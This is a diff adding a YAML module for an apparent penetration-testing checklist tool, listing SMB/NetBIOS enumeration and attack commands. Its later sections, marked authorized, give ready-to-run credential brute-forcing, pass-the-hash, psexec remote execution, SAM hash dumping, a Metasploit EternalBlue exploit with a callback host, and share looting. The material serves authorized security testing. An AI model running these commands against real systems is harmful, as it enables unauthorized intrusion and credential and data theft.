@@ -1,0 +1,177 @@
+module: smb
+name: SMB / NetBIOS (137 / 138 / 139 / 445)
+inputs: [USERS, PASS, OUT]
+
+# 137 = NetBIOS name service (UDP), 138 = NetBIOS datagram (UDP),
+# 139 = NetBIOS session / SMB over NetBIOS (TCP), 445 = SMB direct (TCP).
+# Commands default to $IP/$PORT; NetBIOS name steps target 137 regardless.
+
+sections:
+
+  - id: initial
+    name: Initial Access & Detection
+    steps:
+      - id: version
+        text: Confirm live / SMB version + dialect
+        commands: |
+          nmap -p139,445 -sV $IP
+          nmap -p445 --script=smb-protocols $IP
+          msfconsole -qx "use auxiliary/scanner/smb/smb_version; set RHOSTS $IP; run; exit"
+      - id: netbios
+        text: NetBIOS name / workgroup enumeration (137)
+        commands: |
+          nmblookup -A $IP
+          nbtscan $IP
+          nmap -sU -p137 --script=nbstat $IP
+      - id: security_mode
+        text: SMB security mode / signing
+        commands: |
+          nmap -p445 --script=smb-security-mode,smb2-security-mode $IP
+
+  - id: fingerprint
+    name: Fingerprinting & OS Identification
+    steps:
+      - id: os_discovery
+        text: OS / domain / hostname discovery
+        commands: |
+          nmap -p445 --script=smb-os-discovery $IP
+          enum4linux-ng -A $IP
+      - id: capabilities
+        text: SMB2 capabilities / dialects
+        commands: |
+          nmap -p445 --script=smb2-capabilities $IP
+
+  - id: null_session
+    name: Null / Guest Session Enumeration
+    steps:
+      - id: null_test
+        text: Test null / guest session
+        commands: |
+          rpcclient -U "" -N $IP
+          smbclient -N -L //$IP/
+          netexec smb $IP -u '' -p ''
+      - id: shares
+        text: Enumerate shares + access
+        commands: |
+          smbmap -H $IP
+          netexec smb $IP -u '' -p '' --shares
+          smbclient -N -L //$IP/
+          nmap -p445 --script=smb-enum-shares $IP
+      - id: guest
+        text: Guest access check
+        commands: |
+          netexec smb $IP -u 'guest' -p '' --shares
+          smbmap -H $IP -u guest -p ''
+
+  - id: rpc_enum
+    name: RPC & Domain Enumeration
+    steps:
+      - id: enum4linux
+        text: Full automated enumeration
+        commands: |
+          enum4linux-ng -A $IP
+          enum4linux -a $IP
+      - id: rpcclient
+        text: Interactive RPC enumeration
+        manual: true
+        commands: |
+          rpcclient -U "" -N $IP
+          # srvinfo / enumdomains / querydominfo / netshareenumall / enumdomusers
+      - id: users_groups
+        text: Users / groups / RID cycling
+        commands: |
+          netexec smb $IP -u '' -p '' --users --groups --rid-brute
+          nmap -p445 --script=smb-enum-users,smb-enum-groups $IP
+      - id: samrdump
+        text: SAM user dump via impacket
+        commands: |
+          samrdump.py -port 445 $IP
+          samrdump.py -port 139 $IP
+      - id: rpcdump
+        text: Map RPC endpoints
+        commands: |
+          rpcdump.py -port 139 $IP
+          rpcdump.py -port 445 $IP
+
+  - id: shares_content
+    name: Share Content & Policies
+    steps:
+      - id: recursive_list
+        text: Recursive share listing (with creds if available)
+        commands: |
+          smbmap -H $IP -u $USER -p $PASS -r --depth 5
+          netexec smb $IP -u $USER -p $PASS --shares
+      - id: spider
+        text: Spider shares for interesting files
+        commands: |
+          netexec smb $IP -u $USER -p $PASS -M spider_plus
+          smbmap -H $IP -u $USER -p $PASS -R
+      - id: pull_files
+        text: Download share contents
+        commands: |
+          smbclient //$IP/<share> -N -c 'recurse ON; prompt OFF; mget *'
+          mount -t cifs //$IP/<share> /mnt/smb -o user=<u>,pass=<p>
+      - id: policies
+        text: Password / account policy
+        commands: |
+          netexec smb $IP -u $USER -p $PASS --pass-pol
+          nmap -p445 --script=smb-enum-domains $IP
+
+  - id: vuln
+    name: Vulnerability Identification (fingerprint-driven)
+    steps:
+      - id: cve_map
+        text: Version to CVE mapping
+        commands: |
+          searchsploit samba
+          searchsploit smb
+      - id: script_vuln
+        text: Script-based vuln sweep
+        commands: |
+          nmap -p445 --script="safe or smb-vuln-*" $IP
+      - id: signing_check
+        text: Flag SMB signing not required (relay candidate)
+        commands: |
+          netexec smb $IP --gen-relay-list relay_targets.txt
+          nmap -p445 --script=smb2-security-mode $IP
+
+  - id: creds
+    name: Default & Weak Credentials
+    authorized: true
+    steps:
+      - id: brute
+        text: Credential brute-force / spray
+        commands: |
+          netexec smb $IP -u $USER -p $PASS
+          hydra -L $USERLIST -P $PASSLIST smb://$IP
+          nmap -p445 --script=smb-brute --script-args userdb=$USERLIST,passdb=$PASSLIST $IP
+      - id: brute_msf
+        text: Login check via Metasploit
+        commands: |
+          msfconsole -qx "use auxiliary/scanner/smb/smb_login; set RHOSTS $IP; set USER_FILE $USERLIST; set PASS_FILE $PASSLIST; run; exit"
+      - id: pth
+        text: Pass-the-hash access check
+        commands: |
+          netexec smb $IP -u $USER -H <nt_hash>
+
+  - id: exploit
+    name: Exploitation
+    authorized: true
+    steps:
+      - id: pth_auth
+        text: "Authenticated actions (password or NT hash)"
+        commands: |
+          nxc smb $IP -u $USER -p $PASS --shares --users --sam
+          nxc smb $IP -u $USER -H $NTHASH --shares
+          impacket-psexec $DOMAIN/$USER:$PASS@$IP
+          impacket-wmiexec $DOMAIN/$USER:$PASS@$IP
+      - id: eternalblue
+        text: "MS17-010 / known SMB RCE"
+        commands: |
+          nmap -p445 --script=smb-vuln-ms17-010 $IP
+          msfconsole -qx "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS $IP; set LHOST $LHOST; run; exit"
+      - id: spider
+        text: "Loot readable shares"
+        commands: |
+          nxc smb $IP -u $USER -p $PASS -M spider_plus
+          smbclient //$IP/share -U "$USER%$PASS"
